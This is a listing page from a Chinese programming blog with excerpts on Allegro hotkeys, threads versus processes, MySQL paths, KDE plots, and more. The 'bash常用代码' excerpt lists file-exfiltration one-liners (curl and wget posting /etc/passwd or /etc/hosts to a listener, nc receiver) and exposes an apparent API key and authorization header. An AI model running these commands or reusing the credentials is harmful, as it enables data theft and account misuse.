一、快捷键设置 Allegro可以通过修改env文件来设置快捷键，这对从其它软件如AD或PADS迁移过来的用户来说，可以沿用以前的操作习惯，还是很有意义的。
二、env文件在哪里？ 以我的电脑为例，在安装路径下D:\cadence\Cadence\SPB_Data\pcbenv，用记事本打开env文件，就可以加入自己的快捷方式了。
打开env文件如下图所示：
三、加入自己设置的快捷方式 funckey q "move" （按q键开始移动） funckey w "iangle 45"（按w键旋转45°） funckey w "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5f1ce398f3ed79cc62e234e03792abdf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7feb53c83dcff179bdc3b05aca3b09de/" rel="bookmark">
			线程和进程的优缺点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		线程的优点： 轻量级： 线程相比于进程具有较小的开销，包括创建和销毁线程的开销，以及线程切换的开销。这使得线程更适合处理大量并发任务，并可以实现快速的任务切换和响应。
共享资源： 线程在同一进程内共享相同的内存空间，这意味着线程之间可以直接共享数据和通信，而不需要额外的机制。这样的共享对于在应用程序内共享数据和状态非常方便。
协同执行： 线程适合于协同执行任务，多个线程可以在同一地址空间中协同工作，并共享数据和资源，以实现更高效的协同操作。
并行计算： 线程可以更有效地利用多核处理器并行执行任务，从而提高计算性能和效率。
线程的缺点： 资源竞争： 线程共享相同的内存空间，这容易导致资源竞争和并发访问的问题。如果没有适当的同步和互斥措施，多个线程可能会同时访问和修改相同的数据，导致不确定的结果和程序错误。
死锁： 线程在并发编程中容易出现死锁问题。死锁发生在多个线程互相等待对方释放资源的情况下，导致任务无法继续执行。
错误难以调试： 多线程程序的调试和排错比单线程程序更加困难，因为线程间的相互影响和并发访问导致错误的出现可能是不确定和不可重现的。
进程的优点： 隔离性： 进程是相互独立的，每个进程具有自己独立的内存空间，这意味着一个进程的错误不会影响其他进程的运行。这提高了系统的稳定性和可靠性。
安全性： 进程之间的隔离性使得它们更安全，一个进程的崩溃或异常不会影响其他进程的正常运行。
分布式计算： 进程可以在不同的计算机上运行，并通过网络进行通信。这使得进程适合于构建分布式系统和集群计算，可以充分利用多台计算机的资源。
资源独占： 每个进程拥有自己的资源，如文件描述符、文件系统、网络端口等，这可以用于独占某些资源的情况，避免资源竞争和并发访问的问题。
进程的缺点： 开销大： 创建和销毁进程的开销通常比线程大，涉及到操作系统资源的分配和释放，因此进程的开销相对较大。
通信复杂： 进程间的通信相对复杂，涉及到跨进程的数据传输和同步机制。这需要额外的通信方式和机制，如管道、共享内存、消息队列等，增加了编程的复杂性。
低效： 进程间的切换和通信开销相对较高，因为需要涉及上下文切换和数据传输。这可能会导致性能下降。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f89cfd100be5640fdfe4f8c5ca723ddf/" rel="bookmark">
			Mysql 修改数据存储路径（msi安装）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一.查看mysql的数据存储路径 登录 mysql
show global variables like '%datadir%'; 获取存储路径 %PATH%
二.修改数据存放的路径 关闭MySQL服务
复制 %PATH%上一级目录下的 data文件夹和my.ini 文件 到 想要存放数据的路径下，然后修改 my.ini 文件,把 datadir 的路径改成想要存放的路径
# Path to the database root datadir=D:/Mysql_data/Data 修改新目录文件夹的权限（两种方式）：右键新目录 属性-&gt;安全
(1).添加“NETWORK SERVICE”的组或用户名 并 赋予权限
或者
(2).将下面所有的用户及组授予完全控制权限，生产环境下需要考虑一下权限
三.修改注册表 cmd输入regedit回车打开注册表HKEY_LOCAL_MACHINE–&gt;SYSTEM–&gt;CurrentControlSet–&gt;services，找到MySQL服务键，把ImagePath的值中的路径改为当前使用的配置文件 my.ini 的绝对路径。
.....ver 5.7\bin\mysqld.exe" --defaults-file="D:\Mysql_data\my.ini* MYSQL57" 四.启动Mysql服务 完成数据存储路径的修改 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a304a463c1e04034bf0cec4e768d3445/" rel="bookmark">
			绘制核密度估计图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 核密度估计图（Kernel Density Estimation，KDE）是一种用于估计数据分布的非参数方法，通常用于可视化和理解数据的分布情况。它通过平滑地估计数据的概率密度函数（PDF）来显示数据的分布特征，尤其在连续变量上非常有用。
KDE图通常表现为一条平滑的曲线，描述了数据在特定值附近的密度。这条曲线称为核密度估计。核密度估计是通过将每个数据点视为一个小的概率分布（通常是高斯分布或其他核函数）并将它们叠加而得到的。这样，核密度估计提供了一个对数据分布的连续估计，而不仅仅是一个直方图或散点图。
特点 核密度估计图的主要特点包括：
平滑性： KDE图是平滑的，不受特定的数据点的影响。这使得它可以更好地捕捉数据的分布特征。
面积为1： KDE图的总面积在整个范围内等于1，因为它是概率密度函数的估计。
峰值和谷值： KDE图上的峰值表示数据集中的高密度区域，而谷值表示稀疏区域。
帮助比较： 使用KDE图，你可以比较不同数据集的分布，或者比较数据在不同条件下的分布。这对于发现数据之间的差异和相似性非常有用。
KDE图通常用于探索数据的分布，分析数据的形状和特性，以及为其他分析和建模任务提供数据的可视化表示。你可以使用数据可视化工具（如Seaborn或Matplotlib）来创建KDE图以更好地理解数据。
绘制 可以使用Python中的Seaborn库的seaborn.kdeplot()函数来绘制核密度估计图（Kernel Density Estimation，KDE）。核密度估计图是一种用于估计数据分布的非参数方法，通常用于可视化数据的连续分布。以下是绘制核密度估计图的示例代码：
import matplotlib.pyplot as plt import seaborn as sns # 防止中文乱码 plt.rcParams["font.sans-serif"] = ["SimHei"] plt.rcParams["axes.unicode_minus"] = False import pandas as pd df = pd.read_csv('data/data.csv').dropna() # 分离正负样本 positive_samples = df[df['label'] == 0] negative_samples = df[df['label'] == 1] # 创建一个4x4的子图布局，每行4个子图 fig, axes = plt.subplots(4, 4, figsize=(32, 32), dpi=100) fig.subplots_adjust(hspace=0.5) # 循环遍历每个特征列，绘制核密度估计图 for i, feature in enumerate(df.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a304a463c1e04034bf0cec4e768d3445/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e908fd83d8bd2d20dcb74d26b18343e/" rel="bookmark">
			如何用python脚本实现一次获取token,多次使用token
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这篇文章主要介绍了如何用python脚本实现一次获取token,多次使用token问题,具有很好的参考价值,希望对大家有所帮助,如有错误或未考虑完全的地方,望不吝赐教−
1.两种格式的文件 1）编写配置文件Token.yaml（暂时为空），用来存放token值
另外：用命令：pip3 install ruamel.yaml安装ruamel.yaml模块，用以去除yaml文件中的大括号
2）编写配置文件access_token.yml，把token值写到配置文件中的关键代码如下：
# 把token值写到配置文件access_token.yml中 def write_token(res): curPath = os.path.abspath(os.path.dirname(__file__)) yamlPath = os.path.abspath(os.path.dirname(curPath) + os.path.sep + "configs/access_token.yml") # yamlPath = os.path.dirname(os.path.abspath('.'))+'/data/access_token.yml' # res = json.loads(res) tokenValue = { 'access_token': res["access_token"] } with open(yamlPath, 'w', encoding='utf-8') as f: yaml.dump(tokenValue, f) logger.info("\n token值已保存至配置文件中") 2.编写鉴权文件testingedu_auth.py 用于获取token值并存储token值：
#!/usr/bin/env python # -*- coding:utf-8 -*- # 用pip3命令安装 import requests from ruamel import yaml def test_testingedu_auth(): url = "http://www.XXX.com.cn/XXX/HTTP//auth" headers = {"Content-Type": "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e908fd83d8bd2d20dcb74d26b18343e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43456d8cac5e9eb80a5074f1cd17e926/" rel="bookmark">
			bash常用代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考：
使用 Sublime 替换文本中的换行/回车符等特殊符号
searchsploit
openkeerp-cli
youtube
参考：
https://www.cnblogs.com/mfryf/p/3336288.html
网站文件批量下载 wget --no-check-certificate -i url.txt 文件上传 在某服务器下，没有scp等命令，或者在一个受限的shell里，如何通过curl命令将某目录的文件传输到另外一个服务器上。
接收方： nc -klvn 8888 &gt; file_receiv 传输方 # PUT curl http://ip:8888 -T /path/to/file # POST curl -F data=@/etc/passwd http://burp_server/curl_post # wget wget --post-file=/etc/hosts http://1.1.1.1:443 Ref:
使用 CURL 上传文件 监控系统命令 watch -n 3 -d 'ps aux|grep ping|grep -v grep' Windows下载文件 Invoke-WebRequest "https://ce.contrastsecurity.com/Contrast/api/ng/168bbadf-e988-4ab5-a9f4-ae5a74de2a6d/agents/default/JAVA" -Method Get -ContentType "application/json" -Headers @{"Authorization"="NzdjYWlraWtpQGdtYWlsLmNvbTo2UlJMVkpUSzZOT0tTOVY0";"API-Key"="Lvch0rBXAkZ9dx7bPA614Y0YA5jKPHQl"} -OutFile "~/Downloads/contrast.jar" 参考：
https://ce.contrastsecurity.com/Contrast/static/ng/index.html#/168bbadf-e988-4ab5-a9f4-ae5a74de2a6d/wizard/download/JAVA
Windows 打包/解压文件(powershell) #将文件或文件夹test压缩为test.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/43456d8cac5e9eb80a5074f1cd17e926/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/064f35c862074356bbed01c6a766aa7c/" rel="bookmark">
			【LeetCode】101. 对称二叉树
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		101. 对称二叉树（简单） 方法：递归 思路 两个树互为镜像的条件：
它们的两个根结点具有相同的值。每个树的右子树都与另一个树的左子树镜像对称。 因此，我们需要递归比较左子树和右子树，将根节点的左子树记做 left，右子树记做 right。比较 left 是否等于 right，不相等的话返回false。
如果相当，递归比较 left 的左节点和 right 的右节点，再比较 left 的右节点和 right 的左节点。
代码 /** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode() : val(0), left(nullptr), right(nullptr) {} * TreeNode(int x) : val(x), left(nullptr), right(nullptr) {} * TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {} * }; */ class Solution { public: bool isSymmetric(TreeNode* root) { if(root == nullptr) return true; return dfs(root-&gt;left, root-&gt;right); } bool dfs(TreeNode* left, TreeNode* right) { // 两个节点都为空 if(left == nullptr &amp;&amp; right == nullptr) return true; // 两个节点有一个为空 if(left == nullptr || right == nullptr) return false; // 两个节点的值不相等 if(left-&gt;val !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/064f35c862074356bbed01c6a766aa7c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc6e92b766dd5a38649443c2dd9d4b48/" rel="bookmark">
			S7 PLC SIM (TIA Portal) v15.1安装不了，一直要求重启
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		解决办法 打开注册表，即开始-运行-regedit。进入HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager，将其中的PendingFileRenameOperations项删除，在运行安装文件就可以顺利安装了~并且注册表的这一项会在你下次开机时自动恢复，所以请放心删除
程序下载地址 官网下载地址S7 PLC SIM V15
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac5ce3865f449bd1d5bc284340960f50/" rel="bookmark">
			使用python中xird进行读取文件以及遇到的报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于平日系统导出的文档均为.xls的execel，故本文主要讲如何使用xlrd进行读取表格以及操作过程遇到的报错以及对应解决版本
一、基本使用
准备“成绩表.xlsx”文件，如下：
1、读取文件并获得文件的sheet名字
（1）代码
import xlrd import os def base_use(file_name): file_path = os.path.dirname(os.path.abspath(__file__)) base_path = os.path.join(file_path, file_name) # 打开文件 data = xlrd.open_workbook(base_path) #基本信息1：获取表格sheet名字 sheets_name = data.sheet_names() print(type(sheets_name)) print("获取表格sheetname"+str(sheets_name)) if __name__ =="__main__": base_use("成绩表.xlsx") （2）解析，以及运行结果
通过上面程序，
**解析1:**os.path.dirname获取到python文件所在的绝对路径
使用join函数，将文件进行拼接，从而实现路径的灵活性
解析2:通过sheet_names()获取文件中的sheet页的名字，结果并以list类型存储，后续使用可按照list进行访问
2、读取文件并获取每一行数据
(1)通过sheets方式获取表个数，并通过row_values获取每行数据
遍历获取三个表格每行数据如下：
def get_row_values(filename): file_path = os.path.dirname(os.path.abspath(__file__)) base_path = os.path.join(file_path,filename) #打开文件 data = xlrd.open_workbook(base_path) #获取sheet文档的方式一：sheets函数遍历 print(len(data.sheets())) for i in range(len(data.sheets())): print("___________________________") table = data.sheets()[i] print(table.nrows) for j in range(table.nrows): print(table.row_values(j)) 代码结果：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac5ce3865f449bd1d5bc284340960f50/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/377ec6981e734c7eb2eb5af818dad799/" rel="bookmark">
			远光软件Java开发工程师（实习）学习总结（已脱敏）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文同步于： 远光软件Java开发工程师（实习）学习总结（已脱敏） - 林杰Jason的文章 - 知乎
https://zhuanlan.zhihu.com/p/662111937
远光软件Java开发工程师（实习）学习总结（已脱敏） - 掘金
https://juejin.cn/post/7291243530358849595
远光软件Java开发工程师（实习）学习总结（已脱敏） - CSDN
https://blog.csdn.net/qq_66772340/article/details/133910105
对于技术岗而言，什么是合格简历——以我自己为例 https://docs.qq.com/doc/DSVp0SklPTGh5QXBa
公司：远光软件股份有限公司（国家电网全资子公司国网数字科技有限公司控股），珠海最大A股上市互联网公司 时间：2023.04-2023.06
职位：Java后端开发工程师（实习）、实习生收作业负责人
注：每年4月，远光软件在江财只招5个实习生。
远光天鸿：智能全栈低代码平台 远光天鸿是集智能可视于一体的智能全栈低代码平台，依托灵活的九天智能引擎和强大的建模功能，通过可视化拖拽式组装搭建，以零代码、零UI、零SQL方式帮助业务人员轻松构建敏捷应用、研发人员快速开发复杂应用，有效降低开发技术门槛，极大提升应用交付效率。同时所有应用功能均可在线即时调整，适应性和可扩展性极强，即改即用，有效降低开发及维护成本。让企业应用更敏捷，业务创新更高效。
1、设计即实现：
内置多种代码模板，所作的设计可一键生成相应代码，该代码包含了后端的代码架构、PO（Persistant Object，持久对象）、VO（Value Object，值对象）、BO（Business Object，业务对象）、前端界面、特性功能、基础服务等通用功能，简单场景都可通过设计实现，无需编码。设计即开发，开发即实现。
2、应用建模：
创建企业一体化应用模型，从组织模型、功能模型、流程模型、数据模型及权限模型分析业务应用系统的核心能力，通过对这些层面的模型细化，以及服务能力分析，并引用丰富的企业应用模板，使用配置设计的方式即可实现从通用实体建模到整个应用建模的转变，实现低代码即可打造丰富多样、随需而变的个性化应用，构建全面的应用知识图谱。
3、扩展开发：
智能全栈低代码平台还提供二次开发和配置功能，通过配置中心可对已交付的产品功能在实施期进行二次扩展开发。也可以直接通过配置中心设计业务模型及场景界面、甚至流程，实现个性化应用的配置即运行。
4、智库中心：
智能全栈低代码平台拥有多样的资产资源库，包含应用库、模型库、特性库、组件库、服务库、模式库等。用户在低代码平台根据业务需求复用组装这些沉淀的模型、特性、组件及服务等，即可快速搭建出企业应用。真正实现设计即开发，开发即实现。
参考资料：远光九天智能一体化云平台
第一周学习总结 一、培训内容：
（1）一个应用的诞生
（2）应用的快速快速创建及部署
（3）应用的动态配置-模型及场景
（4）应用的动态配置-业务流程
（5）动态配置-服务器管理
第一周应用建模的课程大家已经完成练习，现在请大家提交这一部分的学习总结，内容只要是跟应用建模以及流程的配置实现相关即可，字数不限。
二、学习总结
九天技术社区帮助文档：https://devcloud.ygsoft.com/jt/mapp/techforumdoor/
在第一周的应用建模课程中，我学到了如何通过平台快速地创建和部署一个应用，并且了解了应用的动态配置过程。这里是我的学习总结。
首先，我们需要在平台上创建一个应用。通过选择应用类型、命名应用、预设场景和功能，我们可以很快地创建一个基本的应用框架。接下来是应用建模的环节，我们需要根据实际需求，对应用进行具体的模型设计。在这个过程中，我们可以使用平台提供的各种模型元素和工具，比如流程图、数据模型等，来构建应用的核心业务逻辑。
在应用建模过程中，我学到了如何定义业务对象、属性和关系，如何通过流程图来描述业务流程和控制逻辑，还学到了如何通过脚本编写来扩展应用的功能。另外，平台支持自定义业务规则，可以方便地对应用的行为进行配置和管理。
除了应用建模，我还学到了应用的动态配置技术。动态配置可以让我们在运行时对应用进行灵活的调整和修改，以满足不同客户的要求。动态配置包括模型和场景配置、业务流程配置、服务器管理等多个方面。通过动态配置，我们可以快速响应客户需求，并且降低维护成本。
在总体上，第一周的应用建模课程让我了解到了应用开发的基本流程和技术，掌握了应用建模、业务流程设计、脚本编写等方面的知识。这些知识对我以后的应用开发工作将会非常有帮助。
三、过程中遇到的问题
以下问题在远光家园中由刘工解答：
默认是天鹿绘制，然后我们这个环境里面没有天鹿的服务，所以界面打不开。要改成向导模式绘制页面，就可以了。
改完之后就能打开向导页面了。
第二周学习总结 请使用 UI4.0(YJPL)框架实现下述用例。在程序设计和实现中，应尽量考虑组件化设计 开发，合理组织代码结构，应用天鸿设计模型场景并导出代码使用，要求符合基于天鸿前 端框架的开发规范。试题内容必须是一个基于 UI4.0(YJPL)框架开发的前端项目。
用例：服务器信息管理应用【基于 UI4.0(YJPL)的 WEB 项目】
用例规格说明
第二周的培训内容包括：
(1) 开发环境安装
(2) YJPL前端开发
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/377ec6981e734c7eb2eb5af818dad799/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c85ce06ab06c0fc7409678b7db4d72c/" rel="bookmark">
			一款基于vue3的简单审批流程开发的表单&#43;流程设计器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 这款基于Vue3开发的简单审批流程表单+流程设计器，旨在为用户提供一种高效、灵活且易用的审批流程构建解决方案。
基于Vue3框架：利用Vue3的响应式原理和组件化开发模式，提升产品的性能和可维护性。简单审批流程：支持简单审批流程的创建、修改和删除，满足用户在不同场景下的审批需求。表单设计器：提供直观的表单设计器，方便用户快速创建和修改表单，支持多种表单元素和数据校验。流程设计器：通过流程设计器，用户可以轻松构建复杂的审批流程，支持流程环节的添加、删除和修改。参数设置：支持设置审批流程中的参数，如环节超时时间、审批人分配规则等，提升流程的灵活性和实用性。 效果图 效果预览 https://github.com/337547038/vue-form-design
使用场景 企业内部审批：企业各部门需要进行各种申请和审批，如报销、请假、采购等，通过该流程可以快速搭建审批流程。团队协作审批：团队项目中进行任务分配、进度审核等需要多人协作的审批流程，该流程可以帮助团队高效协作。自定义审批：任何需要自定义审批的场景，如网站注册、会员申请等，都可以使用该流程进行快速搭建。… 表单设计器 表单设计器是该流程的重要组件之一，它允许用户快速创建和修改表单。以下是表单设计器的主要功能：
表单元素：支持文本框、下拉框、单选框、多选框等多种表单元素，满足不同表单需求。表单验证：内置多种表单验证规则，如必填项、唯一性验证、格式验证等，确保表单数据的准确性。表单布局：支持多种布局方式，如垂直布局、水平布局、网格布局等，方便用户进行表单排版。表单关联：支持表单之间的关联，可以实现表单的动态显示和隐藏，提升用户体验。自定义样式：支持自定义表单元素的样式，如颜色、字体、背景等，方便用户进行个性化定制。… 流程设计器 流程设计器可以帮助用户快速创建、修改和监控审批流程。以下是流程设计器的主要功能：
流程环节：支持添加、删除和修改流程环节，每个环节支持设置环节名称、描述、处理人、处理时间等属性。流程逻辑：支持串行、并行等多种流程逻辑，允许用户根据实际需求进行灵活的流程编排。流程参数：支持设置流程参数，如流程启动条件、环节超时时间、审批人分配规则等，提升流程的智能化水平。流程监控：实时监控流程状态，显示当前环节的处理人、处理时间等信息，方便用户对流程进行跟踪和管理。流程视图：提供直观的流程视图，方便用户进行流程的整体把控和细节调整。 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/39/">«</a>
	<span class="pagination__item pagination__item--current">40/220</span>
	<a class="pagination__item pagination__item--next btn" href="/page/41/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程中国的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>